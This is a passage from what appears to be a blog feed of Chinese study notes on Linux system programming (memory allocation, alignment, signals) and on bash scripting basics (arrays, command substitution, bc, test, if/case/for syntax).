延时，抖动和截止期限"></a>6.5.2 延时，抖动和截止期限</h3><h1 id="第七章-文件与目录管理"><a href="#第七章-文件与目录管理" class="headerlink" title="第七章 文件与目录管理"></a>第七章 文件与目录管理</h1><h2 id="7-1-文件及其元数据"><a href="#7-1-文件及其元数据" class="headerlink" title="7.1 文件及其元数据"></a>7.1 文件及其元数据</h2><p>inode存储了与文件有关的元数据, 如文件的访问权限，最后访问时间，所有者，所有组，大小以及文件数据的存储位置。</p><p>结构stat存储了文件信息. </p><h1 id="第八章-内存管理"><a href="#第八章-内存管理" class="headerlink" title="第八章 内存管理"></a>第八章 内存管理</h1><h2 id="8-1-进程地址空间"><a href="#8-1-进程地址空间" class="headerlink" title="8.1 进程地址空间"></a>8.1 进程地址空间</h2><p>虚拟地址空间(virtual address space)是线性的，从0开始，到某个最大值。</p><h3 id="8-1-1-页和页面调度"><a href="#8-1-1-页和页面调度" class="headerlink" title="8.1.1 页和页面调度"></a>8.1.1 页和页面调度</h3><p>虚拟空间由许多页组成。</p><p>每个页面都只有无效(invalid)和有效(valid)两种状态。</p><p>一般来说虚拟存储器总比物理内存大。</p><h3 id="8-1-2-存储器区域"><a href="#8-1-2-存储器区域" class="headerlink" title="8.1.2 存储器区域"></a>8.1.2 存储器区域</h3><p>内核将具有某些相同特征的页组织成块(blocks), 这些块叫做存储器区域(memory regions), 段(segments), 或者映射(mappings).</p><p>在每个进程中都可以见到的存储器区段:</p><pre><code class="hljs">  - 文本段(text segment).  - 堆栈段(stack).  - 数据段(data segment)，又叫堆(heap).  - BSS段(bss segment).  - 大多数地址空间含有很多映射文件.</code></pre><h2 id="8-2-动态内存分配"><a href="#8-2-动态内存分配" class="headerlink" title="8.2 动态内存分配"></a>8.2 动态内存分配</h2><p>C不支持动态内存的变量。</p><p>C提供了一种机制在动态内存中分配一个足够大的空间保存结构体<code>pirate_ship</code>.</p><p>调用<code>malloc()</code>时，C都会自动地把返回值由void指针转变为需要的类型，但是C++并不提供这种自动转换。</p><p>许多程序都定义和使用封装后的<code>malloc()</code>, 当<code>malloc()</code>返回NULL时就打印错误和终止程序，根据约定，程序员们把这个封装叫做<code>xmalloc()</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/* like malloc(), but terminates on failure */</span><br>void *xmalloc(size_t size)<br>&#123;<br>  void *p;<br>  p = malloc(size);<br>  <span class="hljs-keyword">if</span> (!p) &#123;<br>    perror(<span class="hljs-string">&quot;xmalloc&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(EXIT_FAILURE);<br>  &#125;<br>  return p;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-1-数组分配"><a href="#8-2-1-数组分配" class="headerlink" title="8.2.1 数组分配"></a>8.2.1 数组分配</h3><p><code>calloc</code>将分配区域全部用0进行初始化。</p><p>可定义一个简单的接口:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc0</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-2-调整已分配内存大小"><a href="#8-2-2-调整已分配内存大小" class="headerlink" title="8.2.2 调整已分配内存大小"></a>8.2.2 调整已分配内存大小</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>如果size是0, 效果就会跟在ptr上调用free()相同。</p><p>如果ptr是NULL，结果就会跟malloc()一样。</p><h3 id="8-2-3-动态内存的释放"><a href="#8-2-3-动态内存的释放" class="headerlink" title="8.2.3 动态内存的释放"></a>8.2.3 动态内存的释放</h3><p>自动内存分配，当栈不在使用，空间被自动释放。</p><p>动态内存将永久占有一个进程地址空间的一部分，直到它被显式地释放。</p><p>当整个进程都退出时，所有动态和静态的存储器都荡然无存。 </p><p>调用free()时并不需要检查ptr是否为NULL.</p><h3 id="8-2-4-对齐"><a href="#8-2-4-对齐" class="headerlink" title="8.2.4 对齐"></a>8.2.4 对齐</h3><p>数据的对齐(alignment)是指数据地址和硬件确定的内存块之间的关系。</p><p>一个变量的地址是它大小的倍数时，就叫做自然对齐(naturally aligned).</p><p>在编写可移植的代码的时候，对齐的问题一定要注意，所有的类型都应该保持自然对齐。</p><h4 id="8-2-4-1-预对齐内存的分配"><a href="#8-2-4-1-预对齐内存的分配" class="headerlink" title="8.2.4.1 预对齐内存的分配"></a>8.2.4.1 预对齐内存的分配</h4><p>大多数情况下，编译器和C库会自动处理对齐问题。</p><h4 id="8-2-4-2-其它对齐问题"><a href="#8-2-4-2-其它对齐问题" class="headerlink" title="8.2.4.2 其它对齐问题"></a>8.2.4.2 其它对齐问题</h4><p>非标准类型，四条有用的规则:</p><pre><code class="hljs">- 一个结构的对齐要求和它成员中最大的那个类型是一样的。- 结构体也引入了对填充的要求，以此来保证每一个成员都符合各自的对其要求。注意一下结构体中成员变量的顺序, 来减少填充所导致的空间浪费。- 一个联合的对齐和联合里最大的类型一致。- 一个数组的对齐和数组里的元素类型一致。</code></pre><h2 id="8-3-数据段的管理"><a href="#8-3-数据段的管理" class="headerlink" title="8.3 数据段的管理"></a>8.3 数据段的管理</h2><p>堆和栈的分界线叫做中断(break)或中断点(break point).</p><h2 id="8-4-匿名存储器映射"><a href="#8-4-匿名存储器映射" class="headerlink" title="8.4 匿名存储器映射"></a>8.4 匿名存储器映射</h2><p>实现malloc()最经典方法就是将数据段分为一系列的大小为2的幂的块，返回最小的符合要求的那个块来满足请求。</p><p>释放则是简单的将这块区域标记为未使用.</p><p>一个匿名内存映射只是一块已经用0初始化的大的内存块，以供用户使用，其不基于堆。因其和基于文件的映射相似，但并不基于文件，所以称为匿名。</p><p>匿名内存映射用于满足大的分配。</p><h3 id="8-4-1-创建匿名存储器映射"><a href="#8-4-1-创建匿名存储器映射" class="headerlink" title="8.4.1 创建匿名存储器映射"></a>8.4.1 创建匿名存储器映射</h3><h2 id="8-5-高级存储器分配"><a href="#8-5-高级存储器分配" class="headerlink" title="8.5 高级存储器分配"></a>8.5 高级存储器分配</h2><h2 id="8-6-调试内存分配"><a href="#8-6-调试内存分配" class="headerlink" title="8.6 调试内存分配"></a>8.6 调试内存分配</h2><h2 id="8-7-基于栈的分配"><a href="#8-7-基于栈的分配" class="headerlink" title="8.7 基于栈的分配"></a>8.7 基于栈的分配</h2><p>栈，用来存放程序的自动变量(automatic variables).</p><h2 id="8-9-存储器操作"><a href="#8-9-存储器操作" class="headerlink" title="8.9 存储器操作"></a>8.9 存储器操作</h2><h2 id="8-10-内存锁定"><a href="#8-10-内存锁定" class="headerlink" title="8.10 内存锁定"></a>8.10 内存锁定</h2><h3 id="8-11-1-超量使用和内存耗尽"><a href="#8-11-1-超量使用和内存耗尽" class="headerlink" title="8.11.1 超量使用和内存耗尽"></a>8.11.1 超量使用和内存耗尽</h3><p>分配到的内存比实际物理内存甚至比可用的交换空间多得多叫超量使用(overcommitment).</p><p>当超量使用导致内存不足以满足一个请求时, 我们就说发生了内存耗尽(OOM)(out of memory). 为了处理OOM，内核会使用killer挑选一个进程并终止它。</p><h1 id="第九章-信号"><a href="#第九章-信号" class="headerlink" title="第九章 信号"></a>第九章 信号</h1><p>信号是提供处理异步事件机制的软件中断。</p><h2 id="9-1-信号概念"><a href="#9-1-信号概念" class="headerlink" title="9.1 信号概念"></a>9.1 信号概念</h2><p>信号有一个非常明确的生命周期。</p><h3 id="9-1-1-信号标识符"><a href="#9-1-1-信号标识符" class="headerlink" title="9.1.1 信号标识符"></a>9.1.1 信号标识符</h3><p>每个信号都有一个以<code>SIG</code>为前缀的符号名称。</p><p>这些信号都在<code>&lt;signal.h&gt;</code>头文件中定义的。</p><p>信号被预处理程序简单的定义为正整数，也就是说，每个信号都与一个正整数标识符相关联。</p><p>一个好的程序员因该总是使用信号的可读名称。</p><h2 id="9-2-基本信号管理"><a href="#9-2-基本信号管理" class="headerlink" title="9.2 基本信号管理"></a>9.2 基本信号管理</h2><h2 id="9-9-结论"><a href="#9-9-结论" class="headerlink" title="9.9  结论"></a>9.9  结论</h2><p>信号是从内核接受许多通知的唯一方式。</p><p>信号还是UNIX(Linux)终止进程和管理父&#x2F;子进程关系的方式。</p><h1 id="第十章-时间"><a href="#第十章-时间" class="headerlink" title="第十章 时间"></a>第十章 时间</h1>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Command Line and Shell Scripting Bible Notes</title>
    <link href="/2022/07/17/Linux-Command-Line-and-Shell-Scripting-Bible-Notes/"/>
    <url>/2022/07/17/Linux-Command-Line-and-Shell-Scripting-Bible-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第六章-使用-Linux-环境变量"><a href="#第六章-使用-Linux-环境变量" class="headerlink" title="第六章 使用 Linux 环境变量"></a>第六章 使用 Linux 环境变量</h1><h2 id="6-7-数组变量"><a href="#6-7-数组变量" class="headerlink" title="6.7 数组变量"></a>6.7 数组变量</h2><p>环境变量有一个很酷的特性就是, 它们可作为数组使用.</p><p>要给某个环境变量设置多个值, 可以把值放在括号里, 值与值之间用空格分隔:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$ mytest=(<span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">four</span> <span class="hljs-literal">five</span>)<br></code></pre></td></tr></table></figure><p>使用索引值引用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;mytest[2]&#125;</span></span><br></code></pre></td></tr></table></figure><p>从 0 开始.</p><p>要显示整个数组变量, 可用星号作为通配符放在索引值的位置:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;mytest[*]&#125;</span></span><br></code></pre></td></tr></table></figure><p>可以使用 unset 来删除数组中的某个值, 但其他元素的位置不变, 只是被删除的这个值的位置此时的值为空:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unset</span> mytest[2]</span><br></code></pre></td></tr></table></figure><p>可以删掉整个数组:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">unset</span> mytest</span><br></code></pre></td></tr></table></figure><h1 id="第十一章-构建基本脚本"><a href="#第十一章-构建基本脚本" class="headerlink" title="第十一章 构建基本脚本"></a>第十一章 构建基本脚本</h1><h2 id="11-4-使用变量"><a href="#11-4-使用变量" class="headerlink" title="11.4 使用变量"></a>11.4 使用变量</h2><p>多个命令在同一行执行，使用分号隔开:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">date</span> ; <span class="hljs-built_in">who</span></span><br></code></pre></td></tr></table></figure><p>如果文本文件开头的最前面两个字符是<code>#!</code>，那么后面跟着的就是用来执行这个文件的程序路径.</p><p>shell 通过PATH环境变量来查找命令.</p><p>引用当前目录下的文件，可以使用shell中使用单点操作符:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test1</span><br></code></pre></td></tr></table></figure><p>对于文件而言，全权限值为666, 对于目录而言，全权限值为777.</p><p>默认权限值为全权限值减去umask变量的值.</p><h3 id="11-4-2-用户变量"><a href="#11-4-2-用户变量" class="headerlink" title="11.4.2 用户变量"></a>11.4.2 用户变量</h3><p>在变量、等号和值之间不能出现空格.</p><p>shell 脚本会自动决定变量值的数据类型.</p><p>引用一个变量值时需要使用美元符，而引用变量来对其进行赋值时不要使用美元符:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">value1</span>=<span class="hljs-number">10</span><br><span class="hljs-attr">value2</span>=<span class="hljs-variable">$value1</span><br></code></pre></td></tr></table></figure><p>没有美元符，shell会将变量名解释成普通的文本字符串.</p><h3 id="11-4-3-命令替换"><a href="#11-4-3-命令替换" class="headerlink" title="11.4.3 命令替换"></a>11.4.3 命令替换</h3><p>命令替换允许你将shell命令的输出赋给变量, 有两个格式:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">反引号字符<span class="hljs-comment">(`)</span><br>$<span class="hljs-comment">()</span>格式<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">testing</span>=`date`<br><span class="hljs-attr">testing</span>=$(date)<br></code></pre></td></tr></table></figure><p>命令替换会创建一个子shell来运行对应的命令.</p><h2 id="11-5-重定向输入和输出"><a href="#11-5-重定向输入和输出" class="headerlink" title="11.5 重定向输入和输出"></a>11.5 重定向输入和输出</h2><h2 id="11-7-执行数学运算"><a href="#11-7-执行数学运算" class="headerlink" title="11.7 执行数学运算"></a>11.7 执行数学运算</h2><h3 id="11-7-1-expr命令"><a href="#11-7-1-expr命令" class="headerlink" title="11.7.1 expr命令"></a>11.7.1 expr命令</h3><p>expr命令允许在命令行上处理数学表达式:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">expr</span> 1 + 5</span><br></code></pre></td></tr></table></figure><p>对于那些容易被shell错误解释的字符，在它们传入expr命令之前，需要使用shell的转义字符将其标出来:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">expr</span> 1 \* 5</span><br></code></pre></td></tr></table></figure><h3 id="11-7-2-使用方括号"><a href="#11-7-2-使用方括号" class="headerlink" title="11.7.2 使用方括号"></a>11.7.2 使用方括号</h3><p>在bash中，在将一个数学运算结果赋给某个变量时，可以使用美元符和方括号($[ operation ])将数学表达式围起来:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>var1=<span class="hljs-variable">$[</span><span class="hljs-number">1</span> + <span class="hljs-number">5</span>]<br></code></pre></td></tr></table></figure><p>不用担心shell会误解.</p><p>bash shell 数学运算符只支持整数运算.</p><p>z shell 提供了完整的浮点运算。</p><h3 id="11-7-3-浮点解决方案"><a href="#11-7-3-浮点解决方案" class="headerlink" title="11.7.3 浮点解决方案"></a>11.7.3 浮点解决方案</h3><p>使用bash内建的计算器bc.</p><p>可以在shell提示符下通过<code>bc</code>命令访问bash计算器.</p><p>浮点运算是由内建变量<code>scale</code>控制，用于设置你希望在计算结果中保留的小数位数.</p><p>使用<code>-q</code>命令行选项可以不显示bash计算器的欢迎信息.</p><h4 id="在脚本中使用bc"><a href="#在脚本中使用bc" class="headerlink" title="在脚本中使用bc"></a>在脚本中使用bc</h4><p>变量名似乎不能是大写字母.</p><p>利用命令替换, 基本格式如下:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">variable=<span class="hljs-constructor">$(<span class="hljs-params">echo</span> <span class="hljs-string">&quot;options; expression&quot;</span> | <span class="hljs-params">bc</span>)</span><br></code></pre></td></tr></table></figure><p>使用那联输入重定向(inline input redirection), 需指定一个文本标记来划分输入数据的开始和结尾，文本标记可以为任意字符串:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">marker</span><br><span class="hljs-string">data</span><br><span class="hljs-string">marker</span><br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">variable=$(bc &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">options</span><br><span class="hljs-string">statements</span><br><span class="hljs-string">expressions</span><br><span class="hljs-string">EOF</span><br>)<br></code></pre></td></tr></table></figure><p>在bash计算器中创建的变量只在bash计算其中有效，不能在shell脚本中使用.</p><p>计算幂函数:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ bc<br>power=10^10<br></code></pre></td></tr></table></figure><p>开根号:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ bc<br>result=sqrt(10^10)<br></code></pre></td></tr></table></figure><h2 id="11-8-退出脚本"><a href="#11-8-退出脚本" class="headerlink" title="11.8 退出脚本"></a>11.8 退出脚本</h2><p>退出状态码(exit status)，一个0～255的整数值.</p><h3 id="11-8-1-查看退出状态码"><a href="#11-8-1-查看退出状态码" class="headerlink" title="11.8.1 查看退出状态码"></a>11.8.1 查看退出状态码</h3><p>变量<code>$?</code>来保存上个已执行命令的退出状态码.</p><p>成功结束的命令的退出状态码是0.</p><p>无效命令会返回一个exit status为127.</p><p>exit status为126表示用户没有执行命令的正确权限。</p><h3 id="11-8-2-exit命令"><a href="#11-8-2-exit命令" class="headerlink" title="11.8.2 exit命令"></a>11.8.2 exit命令</h3><p>指定exit status退出.</p><h1 id="第12章-使用结构化命令"><a href="#第12章-使用结构化命令" class="headerlink" title="第12章 使用结构化命令"></a>第12章 使用结构化命令</h1><h2 id="12-1-使用if-then语句"><a href="#12-1-使用if-then语句" class="headerlink" title="12.1 使用if-then语句"></a>12.1 使用if-then语句</h2><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span> <br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>查看<code>if</code>后面<code>command</code>的exit status, 是0, 则执行.</p><p><code>then</code>部分可以有多条命令.</p><h2 id="12-2-if-then-else语句"><a href="#12-2-if-then-else语句" class="headerlink" title="12.2 if-then-else语句"></a>12.2 if-then-else语句</h2><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">else</span> <br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">if</span><br></code></pre></td></tr></table></figure><p><code>else</code>部分也可以包含多条命令.</p><h2 id="12-3-嵌套if"><a href="#12-3-嵌套if" class="headerlink" title="12.3 嵌套if"></a>12.3 嵌套if</h2><p>使用嵌套的<code>if-then</code>语句.</p><p>使用<code>elif</code>语句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span><br>   commands<br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span> <br>   commands<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="12-4-test-命令"><a href="#12-4-test-命令" class="headerlink" title="12.4 test 命令"></a>12.4 test 命令</h2><p>运用<code>test</code>命令通过<code>if-then</code>语句测试其他条件.</p><p>如果<code>test</code>命令中列出的条件成立，<code>test</code>命令就会退出并返回exit status 0.</p><p>格式:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>condition<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> condition<br><span class="hljs-keyword">then</span><br>   commands<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>如果不写test命令的<code>condition</code>部分，它会以非零的退出状态码退出，并执行else语句快.</p><p>可以用test命令确定变量中是否有内容.</p><p>另一种测试方法，不需用test命令:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span><span class="hljs-meta"> [ condition ]</span><br><span class="hljs-attribute">then</span><br>   <span class="hljs-attribute">commands</span><br><span class="hljs-attribute">fi</span><br></code></pre></td></tr></table></figure><p>注意第一个方括号之后和第二个方括号之前必须加上一个空格.</p><p>test命令可以判断三类条件:</p><pre><code class="hljs">1. 数值比较2. 字符串比较3. 文件比较</code></pre><h3 id="12-4-1-数值比较"><a href="#12-4-1-数值比较" class="headerlink" title="12.4.1 数值比较"></a>12.4.1 数值比较</h3><p>不能在test命令中使用浮点值。</p><h3 id="12-4-2-字符串比较"><a href="#12-4-2-字符串比较" class="headerlink" title="12.4.2 字符串比较"></a>12.4.2 字符串比较</h3><pre><code class="hljs">1. 比较时大于号和小于号必须转义。2. 大于和小于顺序和sort命令采取的不同。比较使用的是ASCII顺序, 小写大于大写。sort命令使用的是本地英语，小写字母出现在大写字母之前.</code></pre><p>使用<code>-n</code>和<code>-z</code>参数检查一个变量是否含有数据:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> [ -n <span class="hljs-variable">$var1</span> ]<br></code></pre></td></tr></table></figure><p>空的和未初始化的变量会对shell脚本测试造成灾难性的影响.</p><h3 id="12-4-3-文件比较"><a href="#12-4-3-文件比较" class="headerlink" title="12.4.3 文件比较"></a>12.4.3 文件比较</h3><p>测试Linux文件系统上文件和目录的状态.</p><p>还是使用参数比较.</p><h2 id="12-5-复合条件测试"><a href="#12-5-复合条件测试" class="headerlink" title="12.5 复合条件测试"></a>12.5 复合条件测试</h2><p>有两种布尔运算符可用:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">[ co<span class="hljs-symbol">ndition1</span> ] || [ co<span class="hljs-symbol">ndition2</span> ]<br>[ co<span class="hljs-symbol">ndition1</span> ] &amp;&amp; [ co<span class="hljs-symbol">ndition2</span> ]<br></code></pre></td></tr></table></figure><h2 id="12-6-if-then-的高级特性"><a href="#12-6-if-then-的高级特性" class="headerlink" title="12.6 if-then 的高级特性"></a>12.6 if-then 的高级特性</h2><p>bash shell 提供了两项可在 if-then 语句中使用的高级特性:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 用于数学表达式的双括号<br><span class="hljs-bullet">2.</span> 用于高级字符串处理功能的双方括号<br></code></pre></td></tr></table></figure><h3 id="12-6-1-使用双括号"><a href="#12-6-1-使用双括号" class="headerlink" title="12.6.1 使用双括号"></a>12.6.1 使用双括号</h3><p>格式:</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(( expression ))<br></code></pre></td></tr></table></figure><p>不需要将双括号中表达式里的大于号转义。</p><h3 id="12-6-2-使用双方括号"><a href="#12-6-2-使用双方括号" class="headerlink" title="12.6.2 使用双方括号"></a>12.6.2 使用双方括号</h3><p>格式:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-string">[[ expression ]]</span><br></code></pre></td></tr></table></figure><p>这里的<code>expression</code>使用了test命令中的标准字符串比较，但它提供了模式匹配 pattern matching.</p><p>这里用双等号<code>==</code>其右侧为一个正则表达式.</p><h2 id="12-7-case-命令"><a href="#12-7-case-命令" class="headerlink" title="12.7 case 命令"></a>12.7 case 命令</h2><p>case 命令采用列表格式来检查单个变量的多个值。</p><p>格式：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">case <span class="hljs-keyword">variable</span> in <br>pattern1 | <span class="hljs-comment">pattern2) command1</span>;;<br>pattern3) command2;;<br><span class="hljs-comment">*) default command3;;</span><br>esac<br></code></pre></td></tr></table></figure><p>case 命令会将指定的变量与不同模式进行比较，如果变量和模式是匹配的，那么shell会执行该模式指定的命令.</p><h1 id="13-更多的结构化命令"><a href="#13-更多的结构化命令" class="headerlink" title="13 更多的结构化命令"></a>13 更多的结构化命令</h1><h2 id="13-1-for-命令"><a href="#13-1-for-命令" class="headerlink" title="13.1 for 命令"></a>13.1 for 命令</h2><p>格式:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">for</span> <span class="hljs-keyword">var</span> <span class="hljs-keyword">in</span> list <br><span class="hljs-keyword">do</span><br>    commands<br>done<br></code></pre></td></tr></table></figure><h3 id="13-1-2-读取列表中的复杂值"><a href="#13-1-2-读取列表中的复杂值" class="headerlink" title="13.1.2 读取列表中的复杂值"></a>13.1.2 读取列表中的复杂值</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 使用转义字符来将单引号转义<br><span class="hljs-bullet">2.</span> 使用双引号来定义用到单引号的值<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> I don<span class="hljs-string">\&#x27;t</span> know <span class="hljs-literal">it</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;this&#x27;ll&quot;</span> work<br></code></pre></td></tr></table></figure><p>在某个值的两边使用双引号时，shell并不会将双引号当成值的一部分.</p><h3 id="13-1-3-从变量读取列表"><a href="#13-1-3-从变量读取列表" class="headerlink" title="13.1.3 从变量读取列表"></a>13.1.3 从变量读取列表</h3><h3 id="13-1-4-从命令读取值"><a href="#13-1-4-从命令读取值" class="headerlink" title="13.1.4 从命令读取值"></a>13.1.4 从命令读取值</h3><h3 id="13-1-5-更改字段分隔符"><a href="#13-1-5-更改字段分隔符" class="headerlink" title="13.1.5 更改字段分隔符"></a>13.1.5 更改字段分隔符</h3><p>环境变量<code>IFS</code>, Internal Field Separator. 定义了bash shell 用作字段分隔符的一系列字符.</p><p>默认为:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">空格<br>制表符<br>换行符<br></code></pre></td></tr></table></figure><p>更改为只识别换行符:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 